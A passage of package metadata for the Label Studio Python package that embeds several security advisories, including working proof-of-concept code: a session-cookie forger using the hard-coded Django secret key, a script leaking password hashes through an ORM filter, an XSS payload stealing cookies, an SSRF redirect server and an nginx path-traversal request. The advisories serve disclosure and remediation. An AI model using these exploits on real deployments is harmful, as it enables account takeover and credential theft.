source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.0.post2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.0.post2/","requires_dist":["wheel","appdirs (==1.4.3)","attr (==0.3.1)","attrs (>=19.1.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.26)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (==0.12.2)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.0.post2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"8767bf5c50276387ed961de42f7a363c839315d302ba58cc90e1f65d28a674cf","md5":"550a7d5df182851399823aaf1dcc3864","sha256":"51c4226586629b6763ff9d1629772dfb1a18418a006fd5b81d3789eb56b57502"},"downloads":-1,"filename":"label_studio-1.0.0.post2-py3-none-any.whl","has_sig":false,"md5_digest":"550a7d5df182851399823aaf1dcc3864","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47101065,"upload_time":"2021-03-19T21:19:00","upload_time_iso_8601":"2021-03-19T21:19:00.068876Z","url":"https://files.pythonhosted.org/packages/87/67/bf5c50276387ed961de42f7a363c839315d302ba58cc90e1f65d28a674cf/label_studio-1.0.0.post2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e7fd77d6d5ce444b8fe14c1600d5afdcb812f5c4b1372bfa7e522a69deaaf481","md5":"d2355a5f5eba2ab6ab1236c778881492","sha256":"8af91192c020890f3f7ac62ad3e16519d138bbe29c1f7e366ad870f9bab7880b"},"downloads":-1,"filename":"label-studio-1.0.0.post2.tar.gz","has_sig":false,"md5_digest":"d2355a5f5eba2ab6ab1236c778881492","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":46285751,"upload_time":"2021-03-19T21:19:21","upload_time_iso_8601":"2021-03-19T21:19:21.691943Z","url":"https://files.pythonhosted.org/packages/e7/fd/77d6d5ce444b8fe14c1600d5afdcb812f5c4b1372bfa7e522a69deaaf481/label-studio-1.0.0.post2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': 